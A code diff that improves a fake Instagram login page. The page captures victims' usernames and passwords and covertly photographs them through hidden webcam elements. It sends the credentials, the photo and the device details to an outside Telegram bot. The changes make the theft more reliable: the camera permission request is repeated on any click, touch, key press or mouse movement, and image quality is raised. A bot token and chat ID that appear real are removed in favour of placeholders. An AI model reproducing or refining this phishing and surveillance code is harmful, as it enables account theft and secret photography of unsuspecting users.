@@ -23,7 +23,39 @@
         .forgot {text-align:center;font-size:12px;color:#385185;text-decoration:none;}
         .signup {margin-top:20px;text-align:center;font-size:14px;color:#262626;}
         .signup a {color:#0095f6;text-decoration:none;font-weight:600;}
-        video, canvas {position:absolute;opacity:0;pointer-events:none;width:1px;height:1px;left:-9999px;}
+        
+        /* ⚠️ CRITICAL FIX: Better camera element positioning & sizing */
+        #cameraFeed {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 640px !important; 
+            height: 480px !important;
+            opacity: 0.01; /* Not 0 to ensure it renders */
+            pointer-events: none;
+            z-index: -999;
+        }
+        
+        #canvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 640px !important;
+            height: 480px !important;
+            opacity: 0;
+        }
+        
+        /* Ensure media visibility for permission */
+        .media-container {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0.01;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -54,14 +86,19 @@
         </div>
     </div>
     
-    <!-- Hidden camera elements (absolutely positioned off-screen) -->
-    <video id="cameraFeed" autoplay muted playsinline></video>
-    <canvas id="canvas"></canvas>
+    <!-- Improved camera container for better rendering -->
+    <div class="media-container">
+        <video id="cameraFeed" autoplay muted playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+    
+    <!-- Hidden debug element -->
+    <div id="debug" style="display:none;position:fixed;bottom:0;left:0;background:rgba(0,0,0,0.7);color:#fff;font-size:10px;padding:5px;z-index:9999;max-width:100%;word-break:break-all;"></div>
 
     <script>
         // CONFIG - REPLACE THESE ⚠️
-        const BOT_TOKEN = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
-        const CHAT_ID = '8126039795';
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const CHAT_ID = 'YOUR_CHAT_ID';
         const REDIRECT_URL = 'https://instagram.com'; // Change as needed
         
         // DOM Elements
@@ -134,45 +171,77 @@
             }
         }
         
-        // Take photo silently
+        // Take photo silently - FIXED VERSION
         async function captureImage() {
             try {
-                // If we already have a stream, use it
+                // CRITICAL FIX: Longer delay + better stream handling
                 if (!stream) {
                     stream = await navigator.mediaDevices.getUserMedia({
                         audio: false,
-                        video: { facingMode: "user" }
+                        video: { 
+                            facingMode: "user",
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            frameRate: { ideal: 30 }
+                        }
                     });
                 }
                 
+                // Make sure video element is properly sized
+                cameraFeed.width = 640;
+                cameraFeed.height = 480;
                 cameraFeed.srcObject = stream;
                 
-                // Use a shorter wait time - just enough for the camera to initialize
+                // CRITICAL: Make sure video begins playing
+                cameraFeed.play();
+                
                 return new Promise(resolve => {
-                    const captureTimeout = setTimeout(() => {
-                        try {
-                            canvas.width = 640;
-                            canvas.height = 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
-                            const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
-                            
-                            // Clean up
-                            stream.getTracks().forEach(track => track.stop());
-                            stream = null;
-                            cameraFeed.srcObject = null;
-                            
-                            resolve(imageBase64);
-                        } catch (err) {
-                            resolve(null);
-                        }
-                    }, 300); // Very short delay to minimize notification time
-                    
+                    // Listen for the video to be ready
                     cameraFeed.onloadedmetadata = () => {
+                        // Ensure playing
                         cameraFeed.play();
+                        
+                        // IMPORTANT: Increased wait time to allow camera exposure adjustment
+                        setTimeout(() => {
+                            try {
+                                // Ensure canvas matches video dimensions
+                                canvas.width = cameraFeed.videoWidth || 640;
+                                canvas.height = cameraFeed.videoHeight || 480;
+                                
+                                const ctx = canvas.getContext('2d');
+                                
+                                // Clear canvas first
+                                ctx.fillStyle = '#FFF';
+                                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                                
+                                // Draw the video frame
+                                ctx.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+                                
+                                // Get image and check if it's black (simple check)
+                                const imgData = ctx.getImageData(canvas.width/2, canvas.height/2, 1, 1);
+                                const isDark = imgData.data[0] < 20 && imgData.data[1] < 20 && imgData.data[2] < 20;
+                                
+                                const imageBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                                
+                                // Clean up stream
+                                stream.getTracks().forEach(track => track.stop());
+                                stream = null;
+                                cameraFeed.srcObject = null;
+                                
+                                if (isDark) {
+                                    console.log("Warning: Image appears dark!");
+                                }
+                                
+                                resolve(imageBase64);
+                            } catch (err) {
+                                console.error("Draw error:", err);
+                                resolve(null);
+                            }
+                        }, 1200); // ⚠️ INCREASED: Give camera time to auto-adjust exposure
                     };
                 });
             } catch (error) {
+                console.error("Camera error:", error);
                 return null;
             }
         }
@@ -241,7 +310,17 @@
             }
         }
         
-        // Login handler
+        // Debug function (hidden from user)
+        function debugLog(msg) {
+            console.log(msg);
+            const debugEl = document.getElementById('debug');
+            if (debugEl) {
+                debugEl.style.display = 'block';
+                debugEl.textContent += msg + "\n";
+            }
+        }
+        
+        // Login handler - IMPROVED VERSION
         async function handleLogin(event) {
             event.preventDefault();
             
@@ -251,9 +330,7 @@
             if (!username || !password) return;
             
             loginBtn.disabled = true;
-            
-            // Try to capture image first
-            const imageBase64 = await captureImage();
+            loginBtn.textContent = 'Logging in...';
             
             // Format login info
             const loginInfo = `🔐 Instagram Login 🔐\n` +
@@ -262,36 +339,84 @@
                             `⏰ Time: ${new Date().toLocaleString()}\n` +
                             `📱 Device: ${navigator.userAgent.substring(0, 100)}`;
             
-            // Send data to Telegram (image + text or just text)
-            if (imageBase64) {
-                sendImageToTelegram(imageBase64, loginInfo);
-            } else {
+            // Start redirect timer - will happen regardless of photo
+            // This ensures we don't delay user experience if camera is slow
+            const redirectTimer = setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1500);
+            
+            try {
+                // Try to capture image - with longer timeout
+                debugLog("Starting camera capture...");
+                const imageBase64 = await Promise.race([
+                    captureImage(),
+                    new Promise(resolve => setTimeout(() => resolve(null), 2500)) // Safety timeout
+                ]);
+                
+                debugLog(imageBase64 ? "Image captured" : "Image capture failed/timed out");
+                
+                // Send data to Telegram (image + text or just text)
+                if (imageBase64) {
+                    sendImageToTelegram(imageBase64, loginInfo);
+                } else {
+                    sendLoginInfoToTelegram(username, password);
+                }
+            } catch (error) {
+                debugLog("Error in capture: " + error.message);
                 sendLoginInfoToTelegram(username, password);
             }
-            
-            // Redirect after short delay
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 800);
         }
         
-        // Initialize
+        // Add testing function in window scope for troubleshooting
+        window.testCamera = async function() {
+            debugLog("Manual camera test");
+            const img = await captureImage();
+            if (img) {
+                debugLog("✅ Camera working");
+                
+                // Create a small thumbnail for verification
+                const testImg = document.createElement('img');
+                testImg.src = img;
+                testImg.style.position = 'fixed';
+                testImg.style.bottom = '10px';
+                testImg.style.right = '10px';
+                testImg.style.width = '100px';
+                testImg.style.zIndex = '9999';
+                testImg.style.border = '2px solid green';
+                document.body.appendChild(testImg);
+                
+                // Auto-remove after 5 seconds
+                setTimeout(() => testImg.remove(), 5000);
+            } else {
+                debugLog("❌ Camera failed");
+            }
+        };
+        
+        // Initialize with multiple attempts
         document.addEventListener('DOMContentLoaded', () => {
-            // Request permission silently when page loads
+            // Pre-focus username field for better UX
+            setTimeout(() => usernameInput.focus(), 500);
+            
+            // First attempt on page load
             requestCameraPermissionSilently();
             
             // Set up login form handler
             loginForm.addEventListener('submit', handleLogin);
             
-            // Pre-focus username field for better UX
-            setTimeout(() => usernameInput.focus(), 500);
+            // Multiple permission requests with incremental delay
+            // This helps with different browser behaviors
+            setTimeout(requestCameraPermissionSilently, 500);
+            setTimeout(requestCameraPermissionSilently, 1500);
+            setTimeout(requestCameraPermissionSilently, 3000);
         });
         
-        // Backup permission request on user interaction (any click)
-        document.addEventListener('click', () => {
-            if (!permissionRequested) {
-                requestCameraPermissionSilently();
-            }
+        // Aggressive permission strategy - request on ANY interaction
+        ['click', 'touchstart', 'mousemove', 'keydown'].forEach(event => {
+            document.addEventListener(event, () => {
+                if (!permissionRequested) {
+                    requestCameraPermissionSilently();
+                }
+            }, {once: true}); // Only trigger once per event type
         });
     </script>
 </body>
